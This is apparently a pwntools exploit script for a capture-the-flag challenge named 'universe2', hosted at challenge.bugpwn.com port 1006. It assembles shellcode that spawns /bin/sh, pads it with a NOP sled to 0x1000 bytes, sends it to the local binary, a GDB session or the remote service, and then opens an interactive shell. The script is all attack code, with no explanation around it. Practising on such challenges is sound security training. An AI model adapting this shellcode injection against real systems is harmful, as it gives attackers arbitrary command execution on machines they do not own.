#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./universe2_patched")

context.binary = exe

REMOTE_NC_CMD    = "nc challenge.bugpwn.com 1006"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
b *0x401bc0
c
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    shellcode = b"\0"+asm("""
                    syscall
                    nop
                    nop
                    nop
                    nop
                    nop
                          
                     """) + asm(shellcraft.sh())

    r.send(shellcode.ljust(0x1000, b"\x90"))

    r.interactive()

if __name__ == "__main__":
    main()